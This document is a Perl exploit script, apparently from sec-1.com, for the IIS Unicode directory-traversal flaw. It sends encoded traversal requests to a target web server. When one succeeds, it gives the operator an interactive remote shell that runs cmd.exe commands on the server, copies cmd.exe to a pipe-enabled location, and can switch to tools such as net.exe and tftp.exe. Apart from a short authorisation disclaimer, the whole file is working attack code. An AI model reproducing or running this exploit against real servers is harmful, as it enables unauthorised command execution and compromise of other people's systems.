## IIS Unicode Proof of concept code. 
##      http://www.sec-1.com
## This proof of concept code is to be used for testing web servers which the user
## has authorisation to test. This program requires perl 5 and above.
## Please ensure this file is in the same directory as "exploits.txt

use Socket;
$prompt = "cmd\/c";
if (@ARGV<1) {die "\nIIS Unicode/Encode Vulnerability Proof of concept code \n Usage \= IP/host Port e.g. Perl $0 www.target.com\n";}

($host,$port)=split(/:/,@ARGV[0]);$target = inet_aton($host);

## the location of file containing unicode strings format is; string "tab" expected reture "tab" comments
$exploitfile ="exploits.txt";
unless($port){$port = 80;}

open(EXPF,$exploitfile) or die "can't open exploit file $exploitfile\n";

while(<EXPF>){

($a,$d,$d2) = split(/\t/,$_);

@retrn = sendraw("$a HTTP/1.0\r\n\r\n");

foreach $line (@retrn){if ($line =~ $d) { $found ="done" ;last;}

}

if($found eq "done"){
print <<"endc"; 

------------------/ SEC -1 IIS Command Prompt/---------------------------------

\tTo exit use \"exitcmd\" 
\tTo switch from cmd/c use \\\\ To switch back use \/\/. 
\tTo Move to a Pipe enabled cmd.exe use \"##\" buggy
\t\tComments: Exploit\@sec-1.com
-------------------------------------------------------------------------------
endc
}
($ap,$cutoff) = split (/\+/,$a);
while($found eq "done"){

print "$prompt \> "; $cmd = <STDIN>;chomp($cmd);

if ($cmd eq "exitcmd"){exit}elsif($cmd eq "##"){
	# copy cmd to a pipe enabled location

	
	$copystr = $ap . "\+copy+c:\\winnt\\system32\\cmd.exe\+cmd.exe";
	@cmdpipe = sendraw("$copystr HTTP/1.0\r\n\r\n");
	print @cmdpipe;
	foreach $copyed (@cmdpipe){ 
		if ($copyed =~ "file\(s\)"){ 
		($ap,$cutoff) = split(/..%c0%af../,$ap);
		#chomp($ap);
		$ap = $ap. "cmd.exe?/c";        }
		
	}
goto lable1
}
##### Code here if no conditions are met from above
$cmd=~s/ /\%20/g;
############################################################ Switch to From CMD
if ($cmd eq "\\\\"){
	($ap,$cutoff) = split(/cmd.exe/,$ap); 
	print "Enter alternative command e.g. net.exe, tftp.exe > ";$alter = <STDIN>;chomp($alter);
	
$ap = $ap . $alter . "?";
$prompt = $alter;
goto lable1;
}
############################################################ Switch Back to cmd
if ($cmd eq "\/\/"){
	($ap,$cutoff) = split(/$alter/,$ap); 
	
	
$ap = $ap . "cmd.exe?\/c";

$prompt = "cmd\/c";
goto lable1;
}
######################################################################

### this section sends the command string.

$standard = $ap . "\+". "$cmd HTTP/1.0\r\n\r\n";
print $standard;
@fb = sendraw($standard);
print @fb; print "\n";

lable1:
} 

}

################### sendraw sub written by RFP www.wiretrip.net

sub sendraw {   # this saves the whole transaction anyway
	my ($pstr)=@_;
	socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
		die("Socket problems\n");
	if(connect(S,pack "SnA4x8",2,$port,$target)){
		my @in;
		select(S);      $|=1;   print $pstr;
		while(<S>){ push @in, $_;}
		select(STDOUT); close(S); return @in;
	} else { die("Can't connect...\n"); }
}
